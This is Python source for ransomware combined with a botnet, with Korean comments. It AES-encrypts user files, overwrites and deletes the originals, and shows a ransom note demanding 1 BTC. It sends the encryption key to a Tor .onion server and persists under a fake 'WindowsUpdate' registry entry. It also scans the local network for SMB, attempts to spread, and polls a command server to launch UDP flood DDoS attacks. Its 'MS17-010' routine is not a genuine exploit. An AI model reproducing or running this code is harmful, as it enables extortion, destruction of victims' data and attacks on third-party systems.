import os
import random
import socket
import requests
import subprocess
import asyncio
import tempfile
import time
from threading import Thread
from queue import Queue
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from base64 import urlsafe_b64encode
import tkinter as tk
from tkinter import simpledialog, messagebox
from impacket.smbconnection import SMBConnection, SessionError
import shutil
import winreg as reg

# 파일 읽기 및 쓰기
def read_file(filename):
    with open(filename, 'rb') as f:
        return f.read()

def write_file(filename, data):
    with open(filename, 'wb') as f:
        f.write(data)

# 파일 덮어쓰기 및 삭제
def overwrite_and_delete_file(filename):
    with open(filename, 'r+b') as f:
        length = os.path.getsize(filename)
        f.write(bytearray(random.getrandbits(8) for _ in range(length)))
    os.remove(filename)

# 암호화 함수
def encrypt(data, key, iv):
    backend = default_backend()
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend)
    encryptor = cipher.encryptor()
    padder = padding.PKCS7(algorithms.AES.block_size).padder()
    padded_data = padder.update(data) + padder.finalize()
    return encryptor.update(padded_data) + encryptor.finalize()

# 복호화 함수
def decrypt(data, key, iv):
    backend = default_backend()
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend)
    decryptor = cipher.decryptor()
    unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()
    decrypted_data = decryptor.update(data) + decryptor.finalize()
    return unpadder.update(decrypted_data) + unpadder.finalize()

# 키 생성
def generate_key(password, salt):
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=default_backend()
    )
    return kdf.derive(password)

# 랜섬 노트 생성
def write_ransom_note():
    with open("README.txt", 'w') as f:
        f.write("니 파일은 없다\n")
        f.write("내가 다 조졌거든\n")
        f.write("살리고 싶으면 나한테 메일 보내든가: imjg055@gmail.com\n")

# 서버로 키 전송
def send_key_to_server(key):
    url = 'http://urgewe6nofzhevaetkha5yo77f2k6jd5zn3bfcxlqnbfr2wjdba5bgid.onion/store_key'
    data = {'key': urlsafe_b64encode(key).decode('utf-8')}
    proxies = {
        'http': 'socks5h://127.0.0.1:9050',
        'https': 'socks5h://127.0.0.1:9050'
    }
    response = requests.post(url, json=data, proxies=proxies)
    print(data)
    if response.status_code != 200:
        print('Failed to send key to server')
    else:
        print('Key sent to server successfully')

# 피해자에게 메시지 창 띄우기
def show_ransom_message(key, directories_to_encrypt, iv):
    user_key = None
    while user_key != urlsafe_b64encode(key).decode('utf-8'):
        root = tk.Tk()
        root.withdraw()
        root.attributes('-topmost', True)  # 창을 최상단에 표시

        message = (
            "니 파일은 없다\n"
            "내가 다 조졌거든\n"
            "살리고 싶으면 나한테 메일 보내든가: imjg055@gmail.com\n"
            "비트코인으로 1 BTC를 보내고 확인 버튼을 누르세요."
        )
        
        simpledialog.messagebox.showinfo("Ransomware", message, parent=root)

        user_key = simpledialog.askstring("Ransomware", "복호화 키를 입력하세요:", parent=root)
        if user_key == urlsafe_b64encode(key).decode('utf-8'):
            # 복호화 예제
            for directory in directories_to_encrypt:
                for root_dir, dirs, files in os.walk(directory):
                    for file in files:
                        if file.endswith('.enc'):
                            filepath = os.path.join(root_dir, file)
                            encrypted_data = read_file(filepath)
                            decrypted_data = decrypt(encrypted_data, key, iv)
                            write_file(filepath[:-4], decrypted_data)
                            overwrite_and_delete_file(filepath)
            print("Files decrypted and encrypted files deleted successfully!")
        else:
            messagebox.showerror("Error", "잘못된 키입니다. 파일을 복호화할 수 없습니다.", parent=root)

        root.destroy()

# 특정 확장자 파일만 암호화
def encrypt_files_in_directory(directory, extensions, key, iv):
    for root, dirs, files in os.walk(directory):
        for file in files:
            if any(file.endswith(ext) for ext in extensions):
                filepath = os.path.join(root, file)
                plaintext = read_file(filepath)
                ciphertext = encrypt(plaintext, key, iv)
                write_file(filepath + '.enc', ciphertext)
                overwrite_and_delete_file(filepath)

# 지속성 유지 함수
def ensure_persistence():
    user_profile = os.environ.get('USERPROFILE')
    source_file = __file__
    dest_file = os.path.join(user_profile, 'AppData', 'Roaming', 'WindowsUpdate.exe')
    if not os.path.exists(dest_file):
        shutil.copyfile(source_file, dest_file)
        key = reg.HKEY_CURRENT_USER
        key_value = 'Software\\Microsoft\\Windows\\CurrentVersion\\Run'
        try:
            open_key = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
            reg.SetValueEx(open_key, 'WindowsUpdate', 0, reg.REG_SZ, dest_file)
            reg.CloseKey(open_key)
        except Exception as e:
            print(f'Failed to add to startup: {e}')

# Nmap 설치 확인 및 설치 함수
def ensure_nmap_installed():
    try:
        # Windows에서 Nmap 설치 확인
        result = subprocess.run(["nmap", "--version"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if result.returncode != 0:
            raise FileNotFoundError

    except FileNotFoundError:
        print("Nmap is not installed. Installing Nmap...")
        # Windows에 Nmap 설치 (인터넷 연결 필요)
        nmap_installer_url = "https://nmap.org/dist/nmap-7.92-setup.exe"
        installer_path = os.path.join(os.environ['TEMP'], "nmap-setup.exe")
        response = requests.get(nmap_installer_url)
        with open(installer_path, 'wb') as installer_file:
            installer_file.write(response.content)
        subprocess.run([installer_path, "/S"], check=True)  # Silent installation

# Nmap을 사용한 네트워크 스캔 함수
def nmap_scan_network():
    local_ip = socket.gethostbyname(socket.gethostname())
    base_ip = '.'.join(local_ip.split('.')[:-1]) + '.'
    target_range = f"{base_ip}0/24"

    # Nmap 명령 실행
    result = subprocess.run(["nmap", "-p", "445", "--open", target_range], stdout=subprocess.PIPE)
    output = result.stdout

    # Nmap 결과에서 IP 주소 추출
    ips = []
    for line in output.splitlines():
        line = line.decode(errors='ignore')  # 디코딩 오류 무시
        if "Nmap scan report for" in line:
            ip = line.split()[-1]
            ips.append(ip)
    print(ips)
    return ips

# 비동기 MS17-010 취약점 이용 함수
async def exploit_ms17_010(target_ip):
    try:
        conn = SMBConnection(target_ip, target_ip)
        conn.login('', '')
        print(f'[+] {target_ip} is vulnerable to MS17-010')
        
        # 원격으로 폴더 생성 악성 코드 실행
        temp_dir = tempfile.gettempdir()
        remote_command = 'cmd.exe /c mkdir C:\\Users\\Public\\Desktop\\TestFolder'
        conn.send_trans(None, remote_command.encode('utf-16le'))
        
        print(f'[+] Executed remote command on {target_ip}')
        return True
    except SessionError as e:
        print(f'[-] SMB SessionError on {target_ip}: {e}')
        return False
    except Exception as e:
        print(f'[-] Failed to connect to {target_ip}: {e}')
        return False

# 네트워크 스캔 및 확산
async def network_scan_and_infect():
    ensure_nmap_installed()  # Nmap 설치 확인 및 설치
    target_ips = nmap_scan_network()  # Nmap을 사용하여 네트워크 스캔

    tasks = []
    for target_ip in target_ips:
        print(f"{target_ip} 445 open")
        tasks.append(exploit_ms17_010(target_ip))
    results = await asyncio.gather(*tasks)
    for ip, result in zip(target_ips, results):
        if result:
            print(f'Infecting {ip}')

# DDoS 공격 함수
def start_ddos(target_ip, target_port, duration):
    print(f'Starting DDoS attack on {target_ip}:{target_port} for {duration} seconds')
    timeout = time.time() + duration
    a = 0
    while time.time() < timeout:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(b'X' * 1024, (target_ip, int(target_port)))
            sock.close()
            a += 1
            print(a, target_ip, target_port, "attack")
        except Exception as e:
            print(f'Error during DDoS attack: {e}')

# 봇 상태 업데이트 함수
def update_bot_status():
    while True:
        ip = socket.gethostbyname(socket.gethostname())
        try:
            proxies = {
                'http': 'socks5h://127.0.0.1:9050',
                'https': 'socks5h://127.0.0.1:9050'
            }
            response = requests.post(f'http://urgewe6nofzhevaetkha5yo77f2k6jd5zn3bfcxlqnbfr2wjdba5bgid.onion/update_bot', json={'ip': ip}, proxies=proxies)
            if response.status_code != 200:
                print('Failed to update bot status')
        except Exception as e:
            print(f'Error updating bot status: {e}')
        time.sleep(60)  # 1분마다 상태 업데이트

# 봇넷 명령 수신
def botnet_command_listener():
    global server_ip, server_port
    server_ip = 'urgewe6nofzhevaetkha5yo77f2k6jd5zn3bfcxlqnbfr2wjdba5bgid.onion'
    server_port = 80  # Tor 네트워크에서는 일반적으로 포트 80을 사용
    bot_id = register_bot()
    while True:
        try:
            proxies = {
                'http': 'socks5h://127.0.0.1:9050',
                'https': 'socks5h://127.0.0.1:9050'
            }
            response = requests.get(f'http://{server_ip}:{server_port}/get_command/{bot_id}', proxies=proxies)
            command = response.json().get('command', '')
            if command.startswith('DDOS'):
                _, target_ip, target_port, duration = command.split()
                start_ddos(target_ip, target_port, int(duration))
            elif command == 'STOP':
                print('Stopping current command')
                # Implement stopping logic if necessary
        except Exception as e:
            print(f'Error receiving command: {e}')
        time.sleep(10)  # 주기적으로 명령 확인 (10초 간격)

# 봇 등록
def register_bot():
    ip = socket.gethostbyname(socket.gethostname())
    proxies = {
        'http': 'socks5h://127.0.0.1:9050',
        'https': 'socks5h://127.0.0.1:9050'
    }
    response = requests.post(f'http://{server_ip}:{server_port}/register_bot', json={'ip': ip}, proxies=proxies)
    if response.status_code == 200:
        return response.json().get('bot_id')
    else:
        print('Failed to register bot')
        return None

# 메인 함수
def main():
    extensions_to_encrypt = ['.txt', '.docx', '.xlsx']  # 여기에 암호화할 파일 확장자 추가
    directories_to_encrypt = ['랜섬웨어\\test\\']  # 여기에 암호화할 디렉토리 추가
    password = b'1234'
    salt = os.urandom(16)
    key = generate_key(password, salt)
    iv = os.urandom(16)

    for directory in directories_to_encrypt:
        encrypt_files_in_directory(directory, extensions_to_encrypt, key, iv)

    # 랜섬 노트 작성
    write_ransom_note()

    # 키 서버로 전송
    send_key_to_server(key)

    print("Files encrypted and key sent to server successfully!")

    # 네트워크 스캔 및 확산
    try:
        asyncio.run(network_scan_and_infect())
    except Exception as e:
        print(f'Error during network scan and infect: {e}')

    print("확산 완료")

    # 지속성 유지
    try:
        ensure_persistence()
    except Exception as e:
        print(f'Error ensuring persistence: {e}')

    print("지속성 완료")

    # 멀티스레딩으로 봇넷 명령 수신 및 메시지 창 실행
    botnet_thread = Thread(target=botnet_command_listener)
    botnet_thread.start()

    # 봇 상태 업데이트 스레드 시작
    status_thread = Thread(target=update_bot_status)
    status_thread.start()

    show_ransom_message(key, directories_to_encrypt, iv)

if __name__ == '__main__':
    main()
